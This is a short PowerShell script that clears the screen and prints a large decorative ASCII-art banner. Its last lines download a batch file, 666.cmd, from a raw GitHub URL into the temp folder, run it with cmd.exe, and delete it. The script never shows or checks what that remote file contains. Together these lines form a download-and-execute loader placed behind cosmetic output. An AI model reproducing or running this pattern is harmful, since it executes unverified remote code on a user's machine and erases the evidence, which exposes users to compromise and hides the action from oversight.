Clear-Host

$topBone = "   (o)=======================================================(o)   "
$botSnake = "   ~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~<:===  "

$banner = @(
    "   ____    ______                _    __    __    __   "
    "  / __ \  |  ____|              (_)  / /   / /   / /   "
    " / / _`` | | |__    _ __   __ _   _  / /_  / /_  / /_   "
    "| | (_| | |  __|  | '__| / _`` | | || '_ \| '_ \| '_ \  "
    "| \__,_ | | |     | |   | (_| | | || (_) | (_) | (_) | "
    " \____/   |_|     |_|    \__,_| | | \___/ \___/ \___/  "
    "                               _/ |                    "
    "                              |__/                     "
)

# Calculate center padding based on current PowerShell window width
$winWidth = $Host.UI.RawUI.WindowSize.Width
$boxWidth = $banner[0].Length
$padSize = [Math]::Max(0, [Math]::Floor(($winWidth - $boxWidth) / 2))
$pad = " " * $padSize

Write-Host ""
Write-Host ($pad + $topBone) -ForegroundColor Gray
Write-Host ""

foreach ($line in $banner) {
    Write-Host $pad -NoNewline
    Write-Host $line -ForegroundColor Yellow -BackgroundColor Black
}

Write-Host ""
Write-Host ($pad + $botSnake) -ForegroundColor Green
Write-Host ""

$url = "https://raw.githubusercontent.com/lenonschizophrenic-crypto/devil_named_Fraj/main/666.cmd"
$tempFile = "$env:TEMP\666.cmd"

Invoke-RestMethod -Uri $url -OutFile $tempFile
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempFile`"" -Wait
Remove-Item -Path $tempFile -Force
